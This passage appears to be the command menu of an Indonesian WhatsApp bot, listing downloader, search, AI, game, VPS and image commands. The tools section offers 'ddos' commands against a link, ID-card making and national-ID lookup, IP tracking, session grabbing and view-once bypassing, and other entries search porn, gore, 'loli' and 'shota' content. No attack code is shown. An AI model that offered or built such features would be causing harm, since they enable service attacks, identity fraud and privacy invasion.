${global.tTeks}tiktok2 *link*
${global.tTeks}tiktok3 *link*
${global.tTeks}tiktokslide *link*
${global.tTeks}threads *link*
${global.tTeks}threads2 *link*
${global.tTeks}threadsimg *link*
${global.tTeks}terabox *link*
${global.tTeks}telestick *link*
${global.tTeks}twitdl *link*
${global.tTeks}twitter *link*
${global.tTeks}twitter2 *link*
${global.tTeks}unsplash *query*
${global.tTeks}unsplash2 *query*
${global.tTeks}video *query*
${global.tTeks}wattpad *link*
${global.tTeks}wattpadsearch *query*
${global.tTeks}xnxxsearch *query*
${global.tTeks}xnxxsearch2 *query*
${global.tTeks}xnxxsearch3 *query*
${global.tTeks}xnxxdl *link*
${global.tTeks}xnxxdl2 *link*
${global.tTeks}xvideosearch *query*
${global.tTeks}xvideodl *link*
${global.tTeks}youtube *link*
${global.tTeks}ytvn *link*
${global.tTeks}ytmp3 *link*
${global.tTeks}ytmp3v2 *link*
${global.tTeks}ytmp4 *link*
${global.tTeks}ytmp4v2 *link*
${global.tTeks}ytplay *link*
${global.tTeks}ytsearch *link*
${global.tTeks}zippy *link*
${simboltengah}
${simbol0} *S E A R C H - M E N U*
${simboltengah}
${global.tTeks}9apps *query*
${global.tTeks}apksearch *query*
${global.tTeks}apkmirorsearch *query*
${global.tTeks}bukalapak *query*
${global.tTeks}beasiswa
${global.tTeks}covid *query*
${global.tTeks}drakor *query*
${global.tTeks}dafont *query*
${global.tTeks}dafontsearch *query*
${global.tTeks}dafontdl *link*
${global.tTeks}duckduckgo *query*
${global.tTeks}domainsearch *query*
${global.tTeks}event
${global.tTeks}goglereverse *reply Image*
${global.tTeks}gore
${global.tTeks}gsmarena *query/link*
${global.tTeks}harilibur *query*
${global.tTeks}jobstreet *query*
${global.tTeks}lk21 *query*
${global.tTeks}lk21now
${global.tTeks}linesticksearch *query*
${global.tTeks}music *query*
${global.tTeks}mahasiswa *query*
${global.tTeks}nekopoi *link*
${global.tTeks}nekopoisearch *query*
${global.tTeks}nhentaipdf *kode*
${global.tTeks}nhentaiget *kode*
${global.tTeks}nhentaisearch *query*
${global.tTeks}nhentainew
${global.tTeks}pornhub *query/link*
${global.tTeks}randompornhub
${global.tTeks}randompornhub2
${global.tTeks}stackoverflow *query*
${global.tTeks}steam *query*
${global.tTeks}searchbokepindo *query*
${global.tTeks}streambokepindo *link*
${global.tTeks}searchplace *query*
${global.tTeks}songfinder *query/token*
${global.tTeks}telesticksearch *query*
${global.tTeks}tiktoksearch *query*
${global.tTeks}tiktoksearch2 *query*
${global.tTeks}trendtwit *country*
${global.tTeks}trendyt *country*
${global.tTeks}trendgoogle *country*
${global.tTeks}urbandic *query*
${global.tTeks}whatmusic *reply audio/video*
${global.tTeks}wallpaper
${global.tTeks}webtoon *query*
${global.tTeks}xhamster *query/link*
${global.tTeks}xhamsterdetail *link*
${global.tTeks}yandexreverse *reply Image*
${global.tTeks}ytplaylist *url*
${global.tTeks}zerochan *query*
${simboltengah}
${simbol0} *A I - M E N U*
${simboltengah}
${global.tTeks}3dmodel-ai *prompt*
${global.tTeks}3dr *prompt*
${global.tTeks}ask *query*
${global.tTeks}aimage *query*
${global.tTeks}animediff *prompt*
${global.tTeks}animeart *prompt*
${global.tTeks}aiscene *reply*
${global.tTeks}ai-img *query*
${global.tTeks}ai-real *prompt*
${global.tTeks}ai-pixel *prompt*
${global.tTeks}ai-gemini *query*
${global.tTeks}aiphotolabs *query*
${global.tTeks}aiv2 *query*
${global.tTeks}aivoice *query*
${global.tTeks}anything *prompt*
${global.tTeks}b.ai *query*
${global.tTeks}bard *query*
${global.tTeks}bard2 *question*
${global.tTeks}bardimg *reply*
${global.tTeks}bing *query*
${global.tTeks}bing2 *query*
${global.tTeks}bingimg *query*
${global.tTeks}bingimg2 *query*
${global.tTeks}bingimg-2d *prompt*
${global.tTeks}bingimage *query*
${global.tTeks}blackbox *query*
${global.tTeks}blackboximg *reply|query*
${global.tTeks}c.ai *query*
${global.tTeks}cartoonme *reply*
${global.tTeks}chatgpt *query*
${global.tTeks}chatgptimg *reply|query*
${global.tTeks}claude-ai *query*
${global.tTeks}createimg *prompt*
${global.tTeks}colorize *reply Img*
${global.tTeks}dalle *prompt*
${global.tTeks}dehaze *reply Img*
${global.tTeks}degreeguru *query*
${global.tTeks}differentme *query*
${global.tTeks}differentme2 *query*
${global.tTeks}disney *prompt*
${global.tTeks}diffusion *prompt*
${global.tTeks}diffusion2 *prompt*
${global.tTeks}enc *query*
${global.tTeks}enhance *image*
${global.tTeks}esrgan *reply*
${global.tTeks}emi *prompt*
${global.tTeks}gemini *query*
${global.tTeks}gemini-img *reply Image*
${global.tTeks}gimage *query*
${global.tTeks}gimage2 *query*
${global.tTeks}greyscale *reply*
${global.tTeks}gambar *query*
${global.tTeks}google *query*
${global.tTeks}google-ai *query*
${global.tTeks}gptpicture *query*
${global.tTeks}gptpicture2 *query*
${global.tTeks}gptweb *query*
${global.tTeks}hdv2 *reply img*
${global.tTeks}hd *reply img*
${global.tTeks}hdvid *reply vid*
${global.tTeks}hercai *query*
${global.tTeks}hercai-img *prompt*
${global.tTeks}img2pixel *reply img*
${global.tTeks}jadigta *reply img*
${global.tTeks}kayy *query*
${global.tTeks}kayychat *enable / disable*
${global.tTeks}lirik *query*
${global.tTeks}lyrics *query*
${global.tTeks}lexicart *query*
${global.tTeks}llama *query*
${global.tTeks}lumin-ai *query*
${global.tTeks}leolm-ai *query*
${global.tTeks}mangadiff *prompt*
${global.tTeks}midjourny *query*
${global.tTeks}midjourny2 *prompt*
${global.tTeks}mixtral-ai *query*
${global.tTeks}mistral-ai *query*
${global.tTeks}naw *query*
${global.tTeks}openai/ai *query*
${global.tTeks}palm-ai *query*
${global.tTeks}prompt *reply Img*
${global.tTeks}promptgen *prompt*
${global.tTeks}prodia *prompt*
${global.tTeks}phi3-ai *query*
${global.tTeks}pixelate *reply Image*
${global.tTeks}pixelart *prompt*
${global.tTeks}pixart *model|prompt*
${global.tTeks}photoleap *prompt*
${global.tTeks}ragbot-ai *query*
${global.tTeks}runphp *query*
${global.tTeks}readrecipe *link*
${global.tTeks}recipe *query*
${global.tTeks}realistic *prompt*
${global.tTeks}realistic2 *prompt*
${global.tTeks}recolor *reply Img*
${global.tTeks}recognize *reply img*
${global.tTeks}removebg *reply img*
${global.tTeks}removebg2 *reply*
${global.tTeks}remini *reply img*
${global.tTeks}remini2 *reply|scala*
${global.tTeks}stablediff *query*
${global.tTeks}stablediff2 *prompt*
${global.tTeks}sindy-ai *query*
${global.tTeks}stability-ai *prompt*
${global.tTeks}seaart *prompt*
${global.tTeks}sooks-ai *text detector*
${global.tTeks}simi *query*
${global.tTeks}simichat *enable / disable*
${global.tTeks}simivoice *query*
${global.tTeks}smartcontract *query*
${global.tTeks}tinyurl *link*
${global.tTeks}tozombie *reply img*
${global.tTeks}toanime *reply img*
${global.tTeks}toanime2 *reply*
${global.tTeks}text2img *prompt*
${global.tTeks}text2img2 *prompt*
${global.tTeks}text2video *prompt*
${global.tTeks}turnme *reply*
${global.tTeks}upscale *image*
${global.tTeks}2img *query*
${global.tTeks}2img2 *query*
${global.tTeks}waifudiff *prompt*
${global.tTeks}whatanime *reply*
${global.tTeks}wasted *reply Image*
${global.tTeks}wanted *reply Image*
${global.tTeks}whisper *reply audio*
${global.tTeks}you.ai *qeury*
${simboltengah}
${simbol0} *G A M E - M E N U*
${simboltengah}
${global.tTeks}modegame
${global.tTeks}werewolf
${global.tTeks}casino
${global.tTeks}sᴜɪᴛ *ᴍᴇɴᴛɪᴏɴ ᴏʀ ʀᴇᴘʟʏ*
${global.tTeks}ᴛɪᴄᴛᴀᴄᴛᴏᴇ *ᴍᴇɴᴛɪᴏɴ ᴏʀ ʀᴇᴘʟʏ*
${global.tTeks}ᴅᴇʟᴛᴛᴛ
${global.tTeks}dare
${global.tTeks}ᴘᴇᴛᴀᴋʙᴏᴍ
${global.tTeks}ᴅᴇʟᴘᴇᴛᴀᴋʙᴏᴍ
${global.tTeks}ᴛᴇʙᴀᴋɢᴀᴍʙᴀʀ
${global.tTeks}ᴛᴇʙᴀᴋᴀɴɪᴍᴇ
${global.tTeks}ᴛᴇʙᴀᴋᴋᴀʙᴜᴘᴀᴛᴇɴ
${global.tTeks}ᴛᴇʙᴀᴋʟᴀɢᴜ
${global.tTeks}ᴋᴜɪs
${global.tTeks}ᴛᴇʙᴀᴋᴋᴀʟɪᴍᴀᴛ
${global.tTeks}ᴛᴇʙᴀᴋᴋᴀᴛᴀ
${global.tTeks}ᴛᴇʙᴀᴋʟɪʀɪᴋ
${global.tTeks}ᴛᴇʙᴀᴋᴋɪᴍɪᴀ
${global.tTeks}ᴛᴇʙᴀᴋʙᴇɴᴅᴇʀᴀ
${global.tTeks}dare
${global.tTeks}sᴜsᴜɴᴋᴀᴛᴀ
${global.tTeks}slot
${global.tTeks}ᴀsᴀʜᴏᴛᴀᴋ
${global.tTeks}sɪᴀᴘᴀᴋᴀʜᴀᴋᴜ
${global.tTeks}ᴄᴀᴋʟᴏɴᴛᴏɴɢ
${global.tTeks}ᴍᴀᴛʜ ᴍᴏᴅᴇ
${global.tTeks}ғᴀᴍɪʟʏ100
${simboltengah}
${simbol0} *R P G - M E N U*
${simboltengah}
${global.tTeks}me
${global.tTeks}inventory
${global.tTeks}mining
${global.tTeks}buy
${global.tTeks}sell
${global.tTeks}heal
${global.tTeks}hunt
${global.tTeks}adventure
${global.tTeks}luckyday
${global.tTeks}killslime
${global.tTeks}killgoblin
${global.tTeks}killdevil
${global.tTeks}killbehemoth
${global.tTeks}killdemon
${global.tTeks}killdemonking
${global.tTeks}joinrpg
${global.tTeks}sellikan
${global.tTeks}sellbesi
${global.tTeks}sellemas
${global.tTeks}jelajah
${global.tTeks}mancing
${global.tTeks}jualikan
${global.tTeks}jualcoal
${global.tTeks}jualstone
${global.tTeks}jualingot
${global.tTeks}jualkayu
${global.tTeks}jualbahankimia
${global.tTeks}lebur
${global.tTeks}nebang
${global.tTeks}goplanet
${global.tTeks}ojek
${simboltengah}
${simbol0} *T O O L S - M E N U*
${simboltengah}
${global.tTeks}ambilsesi
${global.tTeks}buka *reply ViewOnce*
${global.tTeks}bukavn *reply VoiceOnce*
${global.tTeks}blur *reply*
${global.tTeks}brightness *reply*
${global.tTeks}bypassouo *link Ouo*
${global.tTeks}bypassmiror *link Mirror*
${global.tTeks}coloring *reply|text*
${global.tTeks}cropshape *reply image*
${global.tTeks}chat *reply*
${global.tTeks}cekweb *link*
${global.tTeks}ceknik *NIK*
${global.tTeks}createbarcode *text*
${global.tTeks}createqr *text*
${global.tTeks}cekusia *reply*
${global.tTeks}cekresi *query*
${global.tTeks}chord *query*
${global.tTeks}createmail 
${global.tTeks}df *name file*
${global.tTeks}dbinary *text*
${global.tTeks}ddos *link*
${global.tTeks}ddos-mix *link*
${global.tTeks}dns *query*
${global.tTeks}darkness *reply Image*
${global.tTeks}detectface *reply Img*
${global.tTeks}detectqr *reply*
${global.tTeks}ebinary *text*
${global.tTeks}fetch *link*
${global.tTeks}file/berkas *text*
${global.tTeks}fliptext *text*
${global.tTeks}gi *name file*
${global.tTeks}grup-wa *text*
${global.tTeks}getfps *reply video*
${global.tTeks}invert *reply*
${global.tTeks}ktpmaker *text*
${global.tTeks}lacakip *ip*
${global.tTeks}once *reply*
${global.tTeks}ocr *reply Image*
${global.tTeks}openvonce *reply*
${global.tTeks}readmore *text*
${global.tTeks}reversevid *reply Vid*
${global.tTeks}readbarcode *reply*
${global.tTeks}resize *reply*
${global.tTeks}resolution *reply*
${global.tTeks}sf
${global.tTeks}snobg *reply*
${global.tTeks}shortlink *link*
${global.tTeks}ssweb *link*
${global.tTeks}ssphone *link*
${global.tTeks}styletext *text*
${global.tTeks}subfinder *text*
${global.tTeks}tts *text*
${global.tTeks}tts-tiktok *text*
${global.tTeks}vonce *reply Vn*
${global.tTeks}volaudio *reply audio*
${global.tTeks}volvideo *reply video*
${global.tTeks}webanalyzer *link*
${global.tTeks}webzip *link*
${simboltengah}
${simbol0} *V P S - M E N U*
${simboltengah}
${global.tTeks}deldroplet
${global.tTeks}svps / sendvps
${global.tTeks}listdroplet
${global.tTeks}cekdroplet
${global.tTeks}turnoff
${global.tTeks}turnon
${global.tTeks}sisadroplet
${global.tTeks}rebuild
${global.tTeks}restartvps
${global.tTeks}vps1g1c
${global.tTeks}vps2g1c
${global.tTeks}vps4g2c
${global.tTeks}vps8g4c
${simboltengah}
${simbol0} *L I N O D E - M E N U*
${simboltengah}
${global.tTeks}resetpassword
${global.tTeks}deletelinode
${global.tTeks}listlinode
${global.tTeks}onlinode
${global.tTeks}offlinode
${global.tTeks}rebootlinode
${global.tTeks}rebuildlinode
${global.tTeks}sisalinode
${global.tTeks}saldolinode
${global.tTeks}cekvpslinode
${global.tTeks}linode2gb
${global.tTeks}linode4gb
${global.tTeks}linode8gb
${global.tTeks}linode16gb
${simboltengah}
${simbol0} *P A N E L - M E N U*
${simboltengah}
${global.tTeks}cpanel
${global.tTeks}addusr
${global.tTeks}addsrv
${global.tTeks}admin
${global.tTeks}delusr
${global.tTeks}delsrv
${global.tTeks}detusr
${global.tTeks}listadmin
${global.tTeks}listusr
${global.tTeks}listsrv
${global.tTeks}reinstall
${global.tTeks}restartsrv
${global.tTeks}ramlist
${global.tTeks}spanel
${global.tTeks}startsrv
${global.tTeks}stopsrv
${global.tTeks}suspend
${global.tTeks}tutorial
${global.tTeks}unsuspend 
${global.tTeks}updatesrv
${global.tTeks}webpanel
${simboltengah}
${simbol0} *O T P - M E N U*
${simboltengah}
${global.tTeks}layanan
${global.tTeks}order
${global.tTeks}getorder
${global.tTeks}profile
${global.tTeks}neednokos
${global.tTeks}wanumber
${global.tTeks}nowa
${global.tTeks}nokoswa
${simboltengah}
${simbol0} *G E T - M E N U*
${simboltengah}
${global.tTeks}gethyuv7
${global.tTeks}getcv8
${global.tTeks}gethw22
${global.tTeks}getsesi
${global.tTeks}getcv7
${global.tTeks}getsccampuran
${global.tTeks}gethw20
${global.tTeks}getegg
${global.tTeks}getpm2
${global.tTeks}getscpush
${global.tTeks}getbio
${global.tTeks}getname
${global.tTeks}getpic
${simboltengah}
${simbol0} *S E T - M E N U*
${simboltengah}
${global.tTeks}setvid *Reply Vid*
${global.tTeks}setimage *Image*
${global.tTeks}setquoted *Image*
${global.tTeks}setbio/setbotbio *text*
${global.tTeks}setbotname *text*
${global.tTeks}setdac *Domain|Ptla|Ptlc*
${global.tTeks}setexif *text|Text*
${global.tTeks}setowner *Nomor*
${global.tTeks}setppbot *Reply Img*
${global.tTeks}setppgroup *Reply Img*
${global.tTeks}set-menu
${global.tTeks}typemenu *text*
${global.tTeks}viewmenu *q*
${simboltengah}
${simbol0} *R A N D O M - M E N U*
${simboltengah}
${global.tTeks}afk *text*
${global.tTeks}attp *text*
${global.tTeks}apakah *text*
${global.tTeks}bisakah *text*
${global.tTeks}bagaimanakah *text*
${global.tTeks}besarkecil *text*
${global.tTeks}bucin
${global.tTeks}cuaca *kota*
${global.tTeks}ceritahoror
${global.tTeks}cerpen
${global.tTeks}define *text*
${global.tTeks}emojimix *emoji*
${global.tTeks}emojimix2 *emoji*
${global.tTeks}foliokanan *text*
${global.tTeks}foliokiri *text*
${global.tTeks}faktaunik
${global.tTeks}infogempa
${global.tTeks}infocuaca *kota*
${global.tTeks}jarak *query*
${global.tTeks}kapankah *text*
${global.tTeks}katabijak
${global.tTeks}kbbi *text*
${global.tTeks}kodepos *text*
${global.tTeks}makermeme *text*
${global.tTeks}menfes *text*
${global.tTeks}nulis *text*
${global.tTeks}nuliskanan *text*
${global.tTeks}nuliskiri *text*
${global.tTeks}puisi
${global.tTeks}pantun
${global.tTeks}poll *text*
${global.tTeks}quotes 
${global.tTeks}randomnama
${global.tTeks}storywa *text*
${global.tTeks}translate *text*
${global.tTeks}tsunami
${global.tTeks}ttp *text*
${global.tTeks}wm *reply sticker*
${global.tTeks}wmvideo *reply vid*
${simboltengah}
${simbol0} *F U N - M E N U*
${simboltengah}
${global.tTeks}stupidcheck *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}handsomecheck *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}uncleancheck *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}hotcheck *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}smartcheck *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}greatcheck *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}evilcheck *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}dogcheck *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}coolcheck *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}waifucheck *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}awesomecheck *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}gaycheck *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}cutecheck *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}lesbiancheck *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}hornycheck *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}prettycheck *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}lovelycheck *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}uglycheck *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}checkme *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}nomerhoki *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}ᴀʀᴛɪɴᴀᴍᴀ *text*
${global.tTeks}ᴀʀᴛɪᴍɪᴍᴘɪ *text*
${global.tTeks}ᴋᴇᴄᴏᴄᴏᴋᴀɴᴘᴀꜱᴀɴɢᴀɴ *text*
${global.tTeks}ᴋᴇᴄᴏᴄᴏᴋᴀɴɴᴀᴍᴀ *text*
${global.tTeks}ᴊᴀᴅɪᴀɴᴘᴇʀɴɪᴋᴀʜᴀɴ *text*
${global.tTeks}ʀᴇᴊᴇᴋɪ *text*
${global.tTeks}ꜱɪꜰᴀᴛᴜꜱᴀʜᴀ *text*
${global.tTeks}ᴘᴇᴋᴇʀᴊᴀᴀɴ *text*
${global.tTeks}ᴀʀᴛɪᴛᴀʀᴏᴛ *text*
${global.tTeks}ᴘᴏᴛᴇɴꜱɪᴘᴇɴʏᴀᴋɪᴛ *text*
${global.tTeks}ʀᴀᴍᴀʟᴀɴɴᴀꜱɪʙ *text*
${global.tTeks}ʜᴀʀɪꜱᴀɴɢᴀʀ *text*
${global.tTeks}ʜᴀʀɪʙᴀɪᴋ *text*
${global.tTeks}ꜰᴇɴɢꜱʜᴜɪ *text*
${global.tTeks}ɴᴀɢᴀʜᴀʀɪ *text*
${global.tTeks}ʜᴀʀɪɴᴀᴀꜱ *text*
${global.tTeks}ᴡᴇᴛᴏɴ *text*
${global.tTeks}ᴘᴇʀᴜɴᴛᴜɴɢᴀɴ *text*
${global.tTeks}ᴀʀᴀʜʀᴇᴊᴇᴋɪ *text*
${global.tTeks}ꜱɪꜰᴀᴛ *text*
${global.tTeks}ᴋᴇʙᴇʀᴜɴᴛᴜɴɢᴀɴ *text*
${global.tTeks}ᴍᴇᴍᴀɴᴄɪɴɢ *text*
${global.tTeks}ᴍᴀꜱᴀꜱᴜʙᴜʀ *text*
${global.tTeks}ᴢᴏᴅɪᴀᴋ *text*
${global.tTeks}ꜱʜɪᴏ *text*
${simboltengah}
${simbol0} *R A N D O M - P H O T O*
${simboltengah}
${global.tTeks}aesthetic *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}coffee *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}cople *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}wallpaperanime *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}art *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}bts *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}woof *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}meow *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}lizard *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}cosplay *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}hacker *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}cyber *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}gamewallpaper *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}islamic *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}jennie *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}jiso *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}justina *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}cartoon *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}pentol *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}kucing *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}kpop *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}exo *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}lisa *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}spacee *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}car *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}technology *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}bike *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}shortquote *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}antiwork *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}hacking *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}boneka *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}rose *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}ryujin *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}ulzzangboy *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}ulzzanggirl *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}wallml *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}wallphone *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}mountain *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}goose *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}profilepic *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}couplepic *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}programming *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}pubg *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}blackpink *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}randomboy *ғʀᴇᴇ ᴏɴʟʏ*  
${global.tTeks}randomgirl *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}hijab *ғʀᴇᴇ ᴏɴʟʏ*  
${global.tTeks}chinese *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}indo *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}japanese *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}korean *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}malay *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}thai *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}vietnamese *ғʀᴇᴇ ᴏɴʟʏ*
${simboltengah}
${simbol0} *A N I M E - M E N U*
${simboltengah}
${global.tTeks}videoanime
${global.tTeks}quotesanime
${global.tTeks}otakudesu *query*
${global.tTeks}akira *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}akiyama *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}ana *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}asuna *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}ayuzawa *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}boruto *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}chiho *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}chitoge *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}cosplayloli *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}cosplaysagiri *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}deidara *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}doraemon *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}elaina *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}emilia *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}erza *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}gremory *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}hestia *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}hinata *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}husbu *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}inori *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}isuzu *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}itachi *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}itori *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}kagachan *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}kagura *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}kakasih *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}kaori *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}keneki *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}kotori *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}kurumi *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}loli *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}madara *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}megumin *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}mikasa *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}mikey *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}miku *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}minato *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}naruto *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}neko *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}neko2 *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}nekonime *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}nezuko *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}onepiece *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}pokemon *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}randomnime *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}randomnime2 *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}rize *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}sagiri *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}sakura *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}sasuke *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}shina *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}shinka *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}shinomiya *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}shizuka *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}shota *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}tejina *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}toukachan *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}tsunade *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}waifu *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}animewall *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}yotsuba *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
